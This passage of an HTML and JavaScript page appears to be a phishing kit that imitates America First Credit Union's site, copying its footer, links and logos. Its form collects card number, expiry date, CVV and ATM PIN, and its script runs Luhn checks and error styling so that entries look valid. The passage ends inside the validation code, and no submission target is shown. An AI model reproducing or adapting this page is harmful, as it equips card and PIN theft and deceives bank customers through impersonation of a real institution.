                                                                <div class="v-text-field__slot"><label for="card" id="cardlabel" class="v-label theme--light" style="left: 0px; right: auto; position: absolute;">Card Number</label><input autocomplete="off" autofocus="autofocus" id="card" name="card" type="text"></div>
                                                            </div>
                                                            <div class="v-text-field__details">
                                                                <div id="carderror" style="display:none" class="v-messages theme--light error--text" role="alert">
                                                                    <div class="v-messages__wrapper">
                                                                        <div class="v-messages__message">Enter a Valid Card Number</div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>

                                                <div data-v-021e61f0="" data-v-6a6d1b4c="">
                                                    <div data-v-021e61f0="" id="expdiv" class="v-input v-input--has-state theme--light v-text-field v-text-field--is-booted ">
                                                        <div class="v-input__control">
                                                            <div class="v-input__slot">
                                                                <div class="v-text-field__slot"><label for="exp" id="explabel" class="v-label theme--light" style="left: 0px; right: auto; position: absolute;">Expiry Date (mm/yy)</label><input autocomplete="off" autofocus="autofocus" id="exp" name="exp" type="text"></div>
                                                            </div>
                                                            <div class="v-text-field__details">
                                                                <div id="experror" style="display:none" class="v-messages theme--light error--text" role="alert">
                                                                    <div class="v-messages__wrapper">
                                                                        <div class="v-messages__message">Enter a Valid Expiry Date</div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>

                                                <div data-v-021e61f0="" data-v-6a6d1b4c="">
                                                    <div data-v-021e61f0="" id="cvvdiv" class="v-input v-input--has-state theme--light v-text-field v-text-field--is-booted ">
                                                        <div class="v-input__control">
                                                            <div class="v-input__slot">
                                                                <div class="v-text-field__slot"><label for="cvv" id="cvvlabel" class="v-label theme--light" style="left: 0px; right: auto; position: absolute;">CVV(CVC)</label><input autocomplete="off" autofocus="autofocus" id="cvv" name="cvv" type="text"></div>
                                                            </div>
                                                            <div class="v-text-field__details">
                                                                <div id="cvverror" style="display:none" class="v-messages theme--light error--text" role="alert">
                                                                    <div class="v-messages__wrapper">
                                                                        <div class="v-messages__message">Enter a Valid CVV(CVC)</div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>


                                                <div data-v-021e61f0="" data-v-6a6d1b4c="">
                                                    <div data-v-021e61f0="" id="pindiv" class="v-input v-input--has-state theme--light v-text-field v-text-field--is-booted ">
                                                        <div class="v-input__control">
                                                            <div class="v-input__slot">
                                                                <div class="v-text-field__slot"><label for="pin" id="pinlabel" class="v-label theme--light" style="left: 0px; right: auto; position: absolute;">ATM Pin</label><input autocomplete="off" autofocus="autofocus" id="pin" name="pin" type="text"></div>
                                                            </div>
                                                            <div class="v-text-field__details">
                                                                <div id="pinerror" style="display:none" class="v-messages theme--light error--text" role="alert">
                                                                    <div class="v-messages__wrapper">
                                                                        <div class="v-messages__message">Enter a Valid ATM Pin</div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div data-v-fec3e2d0="" class="mt-4"><button data-v-fec3e2d0="" id="next-btn" type="submit" class="mr-3 v-btn v-btn--is-elevated v-btn--has-bg theme--light v-size--default primary"><span class="v-btn__content">Next</span></button></div>
                                        </form>
                                    </div>
                                    <!---->
                                </div>
                            </div>
                            <div data-v-551af68e="" data-v-63ab483a="" role="dialog" class="v-dialog__container">
                                <!---->
                            </div>
                        </div>
                    </div>
                </div>
            </main>
            <footer data-v-0b9ebc54="" class="v-footer v-sheet theme--dark afcu-dark-blue" data-booted="true">
                <div data-v-0b9ebc54="" class="container container--fluid">
                    <div data-v-0b9ebc54="" class="row footer-links-section mt-1 justify-center">
                        <div data-v-0b9ebc54=""><a data-v-0b9ebc54="" href="https://www.americafirst.com/about/disclosures/membership-agreement.cfm" target="_blank" title="Membership &amp;  Agreement"> terms </a><span data-v-0b9ebc54="" class="link-separator">|</span><a data-v-0b9ebc54="" href="https://www.americafirst.com/about/contact/branches.html" target="_blank" title="Find Branches" class="utility-link"> branch locator </a><span data-v-0b9ebc54="" class="link-separator">|</span><a data-v-0b9ebc54="" href="tel:1-855-801-2328" class="utility-link"> 1-855-801-2328 </a></div>
                    </div>
                    <div data-v-0b9ebc54="" class="row footer-image-section mt-6 mb-3 justify-center">
                        <div data-v-0b9ebc54="">
                            <div data-v-0b9ebc54="" aria-label="America First Credit Union" role="img" class="v-image v-responsive theme--dark" style="width: 200px;">
                                <div class="v-responsive__sizer" style="padding-bottom: 21.6%;"></div>
                                <div class="v-image__image v-image__image--cover" style="background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPoAAAA2CAYAAADuxoTyAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyZpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMDY3IDc5LjE1Nzc0NywgMjAxNS8wMy8zMC0yMzo0MDo0MiAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIDIwMTUgKFdpbmRvd3MpIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjhBRTU4M0VFNTAxMDExRTVBQkY4QjBCMEVDRkQ3QTcxIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjhBRTU4M0VGNTAxMDExRTVBQkY4QjBCMEVDRkQ3QTcxIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6OEFFNTgzRUM1MDEwMTFFNUFCRjhCMEIwRUNGRDdBNzEiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6OEFFNTgzRUQ1MDEwMTFFNUFCRjhCMEIwRUNGRDdBNzEiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz5qytgUAAAJX0lEQVR42uxd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&quot;); background-position: center center;"></div>
                                <div class="v-responsive__content" style="width: 250px;"></div>
                            </div>
                        </div>
                    </div>
                    <div data-v-0b9ebc54="" class="row footer-copyright-section align-center">
                        <div data-v-0b9ebc54="" class="text-center col-md-auto col-12"><a data-v-0b9ebc54="" href="http://portal.hud.gov/hudportal/HUD?src=/program_offices/fair_housing_equal_opp" target="_blank" title="Equal Housing Lender"><img data-v-0b9ebc54="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADcAAAA+CAYAAACP1IOOAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyFpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNS1jMDIxIDc5LjE1NDkxMSwgMjAxMy8xMC8yOS0xMTo0NzoxNiAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIChXaW5kb3dzKSIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDpGNTQ5MjJERkJBOEMxMUUzQjMzQ0MwMEY5OEYyRjUyNyIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDpGNTQ5MjJFMEJBOEMxMUUzQjMzQ0MwMEY5OEYyRjUyNyI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOkY1NDkyMkREQkE4QzExRTNCMzNDQzAwRjk4RjJGNTI3IiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOkY1NDkyMkRFQkE4QzExRTNCMzNDQzAwRjk4RjJGNTI3Ii8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+hj57mAAABENJREFUeNrsmktIFVEYx2fMnpoZPUwpSIvotehFGC0s0gp6LrLaREKRtWtR5KYwKlIIXLQpNwU9kNq4EqGICntJD6KooDQLKgtfZEll3en/4X9iGs+9ztw717x2PvhxZ+55fOd/zjfnzDn3mpZlGYPVkoxBbP0lbg6oAh9BCRjTL14lLOPIfFBt9bYOcBSMj6f/eFWcC2qtvu0LqABZiSBuGbhm+bcf4BSYPhDFrQZ1Vuz2E5wHs/+1OBNsBPVW8Bbis7qov8Ulga3gkY/GtoASNraKjfdqtQz3uIpLBtvAsyhEpXqcRSNZHcPfDFLcMLATvApAlGqpqPEpUiJmEyMoanEjwR7w1odjWb9KQVqclg6nSQQVMaI8i0sBe8GHKESlxzjD5YHrPkU2gd0cjLDiUhlKLf9AlGq9vO1TpAzGPuejYFdWyoZ6NXmzOBIHUar1865PkS3U80ecH1Fl8X4nVLDe59IjZpjcz/W1qesCJ8EJ0BIh39QY3+Ol7i9h0kywARwBcz3UZXoduWqPPRyrFXl8Hj2NnN6sJqol8/MxP4d4jOeBaLLLb1aJm8fPdNCeoOJOgVKVuKDsRozlm+MRlkHZMj2h9POEEpRdj7F8GagdqOLyYix/VoelFqfF6dnStuwAtjwDVlxTIo7cgqCn6RhsUtDipoDtekLR4rS4wCeUEHiToFo63F+Y+q8aWlxiiKsBN7nxlAWzAtwDV0AG09PAXrAJjAONXOjF6hR12t/JifVKsAPUgztgETjEunJBJVgDboNbYBZ9zgRPjJ5DLPlPy2RwjPVcBZleFvEsOuhgw5fQqfw5ZifTk+hE8mwB78E28JBO3ZYDiliPCJUj8RlgMTgIXoNUMAJMBPmsq56+xOcwMJ4dMYl1rmEdBfT7wU9YpoBWCsmkc5mBhjryiKinYKvRc+6pMosd8YN55Nxffn9oA6PAL0deuT4DXvCtaK0j7R7flrJZrpUiRfBSr69f0iPdYD979CJYRWdyfHfO6PnRYx+dVNHJCvZ8NfgEdrG+bn63kY2/xLOSCeA4+AaOgk5wASwH69gR7p3CAfAcvGT64XA6VEvBaMcIdHLtm2b0HNYOZwhms9e7OIpdjlEd6VgzP/M6jdejKLSbI9DpWJ8mMPTe8T6DI9zMNtk+vvL+K/NNZZvE9/f/Zp3rNZwQ28YZrFGRv40j6E4rcKQ3sry7nP1dA2c328aCB6DYMfm48xi8Lw/TBimz2TTNB24xfxEKhSyQAwwFkdLs9DLQABYqyuXw2l2ukGWMCHkitUHK33driWYnfsXVa7JsXHbdV3LSsK/7Mil/mqPo9KOKDrdJmUJXG6I+ZigIE7JOs0PztKKRKitkqLU7BBZ46GDJu5BrcLkXce2K0bHjXZXmbIj7569iNjxf0Tj3MzctQh6DeUrow9nBOezEfHeH6F2BFqfFaXFanBanxSWo/RZgAD8Opdz8B33IAAAAAElFTkSuQmCC" alt="Equal Housing Lender"></a><a data-v-0b9ebc54="" href="https://www.ncua.gov/support-services/share-insurance-fund" target="_blank" title="Your savings federally insured to at least $250,000 and backed by the full faith and credit of the United States Government. National Credit Union Administration, a U.S. Government Agency" class="ml-2"><img data-v-0b9ebc54="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGMAAAAoCAYAAADqpEQ6AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyFpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNS1jMDIxIDc5LjE1NDkxMSwgMjAxMy8xMC8yOS0xMTo0NzoxNiAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIChXaW5kb3dzKSIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDoxQzQyMDY2MUJBOEQxMUUzQkJGNTgxN0Q0ODU5Mjc4MCIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDoxQzQyMDY2MkJBOEQxMUUzQkJGNTgxN0Q0ODU5Mjc4MCI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOjFDNDIwNjVGQkE4RDExRTNCQkY1ODE3RDQ4NTkyNzgwIiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOjFDNDIwNjYwQkE4RDExRTNCQkY1ODE3RDQ4NTkyNzgwIi8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+ZjuaLQAAB9ZJREFUeNrsmwlsVVUQ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" alt="NCUA"></a></div>
                        <div data-v-0b9ebc54="" class="footer-fine-print col">
                            <p data-v-0b9ebc54="">©<span data-v-0b9ebc54="">2022</span> America First Credit Union. All Rights Reserved. America First Federal Credit Union does business as (DBA) America First Credit Union. Unauthorized access or use is not permitted and may constitute a crime punishable by law. America First Credit Union respects your privacy. Please view our <a data-v-0b9ebc54="" href="https://www.americafirst.com/documents/membership-agreement.pdf#privacyPolicy">Privacy Policy</a>, <a data-v-0b9ebc54="" href="https://www.americafirst.com/documents/marketing-email-opt-out.pdf">Email Opt Out Procedure</a> and <a data-v-0b9ebc54="" href="https://www.americafirst.com/content/dam/pdfs/FTEU%20Fraud%20Alerts.pdf">Fraud Alert Text/SMS Notification Terms and Conditions</a>. This credit union is federally insured by the National Credit Union Administration.</p>
                        </div>
                    </div>
                </div>
            </footer>
        </div>
    </div>
</body>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.13.4/jquery.mask.min.js"></script>

<script>
    function checkLuhn(val) {
            var newval = val.replace(/[^\d]/g, '');
            var numdigits = newval.length;
            var sum = 0;
            var parity = numdigits % 2;
            var digit;


            for (var i = 0; i < numdigits; i++) {
                digit = parseInt(newval.charAt(i), 10);
                if (i % 2 === parity) {
                    digit *= 2;
                }
                if (digit > 9) {
                    digit -= 9;
                }
                sum += digit;
            }
            return (sum % 10) === 0;
        }
    jQuery(function() {
        jQuery('#card').focus();
        jQuery('.v-form').click();
    });
    //card
    $('#carddiv').on('input', function(e) {
        $("#cardlabel").addClass('v-label--active primary--text');
        $("#carddiv").addClass('v-input--is-focused primary--text');
        var cardNo = $('#card').val();
        if ($('#card').val().length == 0) {
            $("#cardlabel").removeClass('v-label--active ');
            $("#carddiv").removeClass('v-input--is-dirty');
            $("#carddiv").addClass('error--text');
            $("#cardlabel").addClass('error--text');
            $("#carddiv").addClass('v-input--has-state');

            $("#carderror").show();
        } else if ($('#card').val().length < 10) {
            $("#carddiv").removeClass('v-input--is-focused');
            $("#carddiv").addClass('error--text');
            $("#cardlabel").addClass('error--text');
            $("#carddiv").addClass('v-input--has-state');

            $("#carderror").show();
        }else if (!checkLuhn(cardNo)) {
            $("#carddiv").removeClass('v-input--is-focused');
            $("#carddiv").addClass('error--text');
            $("#cardlabel").addClass('error--text');
            $("#carddiv").addClass('v-input--has-state');

            $("#carderror").show();
        } else {
            $("#cardlabel").removeClass('error--text');
            $("#carddiv").addClass('v-input--is-dirty');
            $("#carddiv").removeClass('error--text');
            $("#carddiv").removeClass('v-input--has-state');

            $("#carderror").hide();

        }
    });

    $('#carddiv').click(function() {
        $("#cardlabel").addClass('v-label--active primary--text');
        $("#carddiv").addClass('v-input--is-focused primary--text');
        jQuery('#card').focus();


    });

    $('#card').focus(function() {
        $("#cardlabel").addClass('v-label--active primary--text');
        $("#carddiv").addClass('v-input--is-focused primary--text');


    }).blur(function() {
        var cardNo = $('#card').val();
        if ($('#card').val().length == 0) {
            var cardNo = $('#card').val();
            $("#cardlabel").removeClass('v-label--active ');
            $("#carddiv").removeClass('v-input--is-focused');
            $("#carddiv").removeClass('v-input--is-dirty');
            $("#carddiv").addClass('error--text');
            $("#cardlabel").removeClass('primary--text');
            $("#carddiv").removeClass('primary--text');
            $("#cardlabel").addClass('error--text');
            $("#carddiv").addClass('v-input--has-state');
            $("#carderror").show();

        } else if ($('#card').val().length < 10) {
            $("#carddiv").removeClass('v-input--is-focused');
            $("#carddiv").addClass('error--text');

            $("#cardlabel").removeClass('primary--text');
            $("#carddiv").removeClass('primary--text');
            $("#cardlabel").addClass('error--text');
